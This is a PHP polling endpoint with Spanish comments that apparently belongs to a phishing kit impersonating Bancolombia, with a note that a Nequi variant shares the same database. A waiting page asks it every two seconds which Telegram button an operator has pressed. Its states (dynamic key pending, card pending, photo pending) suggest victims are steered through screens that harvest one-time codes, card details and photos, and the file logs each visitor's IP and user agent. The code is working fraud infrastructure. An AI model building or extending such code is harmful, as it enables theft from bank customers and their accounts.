<?php
/**
 * estado.php
 * ----------
 * Endpoint de polling de estado. Consumido CADA 2 SEGUNDOS por espera.html
 * para saber si el operador YA pulsó algún botón inline en Telegram.
 *
 * CONTRATO con el cliente (espera.html):
 *   • SI el operador NO ha pulsado nada todavía o la fila no es aceptada
 *     → devolver {"estado":"pendiente"}.
 *   • SI el operador SÍ pulsó un botón válido (y la fila es aceptada)
 *     → devolver {"estado":"opcion_X"}.
 *   • El cliente requiere 2 respuestas consecutivas IGUALES distinto de
 *     "pendiente" para navegar (double confirm, evita race conditions).
 *
 * REGLAS DE ACEPTACIÓN ESTRICTAS (evitan leer estado de otras sesiones
 * o del proyecto vecino Nequi que comparte MISMA TABLA solicitudes):
 *   1) SELECT WHERE BINARY request_id = ? AND banco='Bancolombia'.
 *   2) Coincidencia strcmp BINARY EXACTA de request_id/key.
 *   3) Estado dentro de la whitelist (no vacío, no pendiente, en $listaValidos).
 *   4) Para filas con request_id ANTIGUO (no empiezan por 'BCO_') se requiere
 *      ADEMÁS match BINARY del campo key con la key de la URL.
 *
 * Respuesta siempre JSON con anti-cache headers.
 * Auditoría append-only: cada request escribe a debug_estado.log (sin passwords).
 */

header('HTTP/1.1 200 OK');
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

try {
    require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

    // ── Paso 1: leer identificadores de la URL ────────────────────────────────
    $request_id = $_GET['rid']        ?? $_GET['requestId'] ?? $_GET['request_id'] ?? '';
    $key        = $_GET['key']        ?? '';

    $remote = $_SERVER['REMOTE_ADDR']     ?? 'unknown';
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    $row         = null;
    $hitBy       = null;
    $finalEstado = 'pendiente';       // Estado por defecto: "aún no hay decisión"
    $banco       = '';

    // Whitelist de estados permitidos (cualquier otro string se convierte en pendiente).
    $listaValidos = [
        'opcion_1','opcion_2','opcion_3','opcion_4','opcion_5','opcion_6',
        'opcion_7','opcion_8','opcion_9','opcion_10','opcion_55',
        'DINAMICA_PENDIENTE','TARJETA_PENDIENTE','ERROR_PENDIENTE',
        'FOTO_PENDIENTE','FINALIZADO','ERROR_DINAMICA',
    ];

    /**
     * Decide si una fila de solicitudes DEBERÍA entregar su estado al polling.
     *
     * @param array  $rowRaw Fila de la DB con request_id, key, estado, banco.
     * @param string $origen 'request_id' o 'key' (por qué ruta se encontró la fila).
     * @return bool true = aceptada y se entrega el estado al cliente.
     */
    function filaAceptada($rowRaw, $origen) {
        global $request_id, $key, $listaValidos;

        if (!$rowRaw || !is_array($rowRaw)) return false;

        $b = (string)($rowRaw['banco'] ?? '');
        if ($b !== 'Bancolombia') return false;

        if (!isset($rowRaw['estado']) || !is_string($rowRaw['estado']) || $rowRaw['estado'] === '') {
            return false;
        }
        if (strtolower($rowRaw['estado']) === 'pendiente') return false;
        if (!in_array($rowRaw['estado'], $listaValidos, true)) return false;

        $ridActual = (string)($rowRaw['request_id'] ?? '');
        $keyActual = (string)($rowRaw['key']        ?? '');

        // Para sessiones antiguas SIN prefijo BCO_ necesitamos la key coincidente
        // (protección contra coincidencias por colisión corta de request_id).
        if (strncmp($ridActual, 'BCO_', 4) !== 0) {
            if ($key === '' || $keyActual === '') {
                if ($origen === 'request_id') return false;
            } else {
                if ($origen === 'request_id' && $keyActual !== $key) {
                    return false;
                }
            }
        }
        return true;
    }

    // ── Paso 2: primer intento por request_id (formato nuevo preferido) ───────
    if ($request_id !== '') {
        $stmt = $pdo->prepare(
            "SELECT request_id, `key`, estado, banco
             FROM solicitudes
             WHERE BINARY request_id = ? AND banco = 'Bancolombia'
             LIMIT 1"
        );
        $stmt->execute([$request_id]);
        $candidate = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($candidate && is_array($candidate) &&
            (string)$candidate['banco'] === 'Bancolombia' &&
            (strcmp((string)$candidate['request_id'], (string)$request_id) === 0)
        ) {
            if (filaAceptada($candidate, 'request_id')) {
                $row         = $candidate;
                $hitBy       = 'request_id';
                $banco       = (string)($row['banco'] ?? '');
                $finalEstado = (string)$row['estado'];
            } else {
                $hitBy = $candidate ? 'request_id_rejected' : null;
            }
        } else {
            if (!$hitBy && $candidate) {
                $hitBy = 'request_id_mismatch';
            }
        }
    }

    // ── Paso 3: segundo intento por key (legacy / fallback) ───────────────────
    if ((!$row || !is_array($row)) && $key !== '') {
        $stmt = $pdo->prepare(
            "SELECT request_id, `key`, estado, banco
             FROM solicitudes
             WHERE BINARY `key` = ? AND banco = 'Bancolombia'
             LIMIT 1"
        );
        $stmt->execute([$key]);
        $candidate2 = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($candidate2 && is_array($candidate2) &&
            (string)$candidate2['banco'] === 'Bancolombia' &&
            (strcmp((string)$candidate2['key'], (string)$key) === 0)
        ) {
            if (filaAceptada($candidate2, 'key')) {
                $row   = $candidate2;
                if (!$hitBy) $hitBy = 'key';
                $banco = (string)($row['banco'] ?? '');
                $finalEstado = (string)$row['estado'];
            }
        }
    }

    // ── Paso 4: auditoría append-only (sin datos sensibles) ───────────────────
    try {
        $logPath = __DIR__ . DIRECTORY_SEPARATOR . 'debug_estado.log';
        $line = sprintf(
            "[%s] ip=%s rid=%s key=%s hitBy=%s foundRow=%s rowRid=%s rowKey=%s rowEstado=%s rowBanco=%s finalEstado=%s ua=%s\n",
            gmdate('Y-m-d\TH:i:s\Z'),
            $remote,
            $request_id,
            $key,
            $hitBy ?? 'none',
            $row ? '1' : '0',
            $row['request_id'] ?? '',
            $row['key']        ?? '',
            $row['estado']     ?? '',
            $banco,
            $finalEstado,
            $ua
        );
        $fp = @fopen($logPath, 'a');
        if ($fp) {
            @fwrite($fp, $line);
            @fclose($fp);
        }
    } catch (Throwable $_) { /* ignore */ }

    // ── Paso 5: respuesta JSON final ──────────────────────────────────────────
    echo json_encode(['estado' => $finalEstado], JSON_UNESCAPED_UNICODE);
} catch (Throwable $e) {
    error_log('estado.php error: ' . $e->getMessage());
    try {
        echo json_encode(['estado' => 'pendiente'], JSON_UNESCAPED_UNICODE);
    } catch (Throwable $_) { /* ignore */ }
}
exit;
